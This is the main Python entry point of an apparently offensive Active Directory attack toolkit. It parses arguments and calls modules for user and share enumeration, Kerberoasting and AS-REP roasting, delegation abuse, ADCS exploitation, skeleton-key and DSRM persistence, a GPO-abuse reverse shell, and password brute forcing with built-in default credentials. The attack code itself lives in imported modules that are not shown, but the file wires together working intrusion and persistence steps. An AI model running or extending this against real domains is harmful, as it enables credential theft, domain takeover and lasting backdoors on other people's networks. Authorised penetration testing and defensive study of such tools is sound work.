import argparse, sys
from colored import Style, Fore
from . import cli
from .Modules.utils import run_command, add_users_to_file, load_wordlist, get_domain
from .Modules.miscellaneous import *
from .Exploits.rpc import rpc_bind
from .Exploits.delegation import *
from .Persistence.skeleton import *
from .Persistence.dsrm import *
from .Persistence.GPOHydra import gpoHydra
from .Exploits.ldap import *
from .Exploits.ADCS import exploit_adcs
from .Exploits.roasting import *
from .Exploits.gpoabuse import gpoRevShell
from .Exploits.auto import *
import subprocess

DEFAULT_USERS = ["Administrator", "guest", "admin"]
DEFAULT_PASSWORD = ["", "password", "Password123!", "guest"]

def main():
    args = cli.parse_args()
    ip = args.ip
    protocol = args.protocol
    dc = args.dc
    target = args.target
    domain = get_domain(ip)
    USING_KERBEROS = args.kerberos
    skeleton_key = args.skeleton
    auth = ""
    extras = args.extras
    mssql = args.mssql
    no_output = False

    if target == None: target = ip
    if args.user:
        user = args.user
    elif args.user_list:
        users = load_wordlist(args.user_list, is_password=False)
    else:
        user = ""
        users = DEFAULT_USERS.copy()

    if args.password:
        password = args.password
    elif args.password_list:   
        passwords = load_wordlist(args.password_list, is_password=True)
    else:
        password = ""
        passwords = DEFAULT_PASSWORD.copy()
    
    if args.hash:
        auth = "-H"
        password = args.hash

    if args.dsrm:
        hash = enable_dsrm_auth(ip, user, password, domain)
        subprocess.run(["nxc", "smb", ip, "-u", user, "-H", hash, "--local-auth"])

    if args.scan:
        if args.userscan:
            get_users(protocol, ip, user, password) if is_authenticated(user, password) else get_users(protocol, ip)          
        else:
            default_scan(protocol, ip)
        if args.passwd:
            get_password_pol(protocol, ip, user, password) if is_authenticated(user, password) else get_password_pol(protocol, ip)
        
    if args.shares:
        get_shares(protocol, ip, user, password) if is_authenticated(user, password) else get_shares(protocol, ip)

    if args.enum:
        enum_linux(ip, user, password) if is_authenticated(user, password) else enum_linux(ip)
    
    
    if args.getusers:
        get_users(protocol, ip, user, password) if is_authenticated(user, password) else get_users(protocol, ip)
        
    if args.bloodhound:
        bloodhound(ip, domain, user, password)
    
    if args.rpc:
        rpc_bind(ip, user, password) if is_authenticated(user, password) else rpc_bind(ip)

    if args.findDelegation:
        find_delegation(domain, user, password)
    
    if args.rbcd:
        if args.clean:
            resource_constraited_deleg(domain, user, password, dc, target, True)
        else:
            resource_constraited_deleg(domain, user, password, dc, target)

    if args.skeleton:
        skeleton_mouse(skeleton_key, ip, user, password)
    
    if args.ldapsearch:
        ldap_search(domain, ip, user, password) if is_authenticated(user, password) else ldap_search(domain, ip)
    print(Style.reset)

    if args.findusers:
        find_users(domain, ip, args.user_list)

    if args.adcs:
        esc = args.esc
        exploit_adcs(domain, ip, user, password, target)

    if args.roast:
        if not is_authenticated(user, password):
            found_creds = asrep_roast(ip, args.user_list)
            if found_creds:
                kerberoasting(ip, found_creds=found_creds)
                timeroasting(ip, found_creds=found_creds)
        else:
            get_users(protocol, ip, user, password, no_output)
            results = asrep_roast(ip, "users.txt")
            kerberoasting(ip, user, password, results)
            timeroasting(ip, user, password, results)

    if args.gpoabuse:
        gpoRevShell(args.gpoID, domain, user, password)
    
    if args.gpoHydra:
        gpoHydra(user, password, auth, target, domain, args.action, args.ou, args.name)
    if args.brute_user:
        success = brute_users(ip, users, passwords, auth, domain, USING_KERBEROS) if USING_KERBEROS else brute_users(ip, users, password, auth)
        if success:
            spam_modules(ip, auth, user, password, extras, mssql)
    
if __name__ == "__main__":
    main()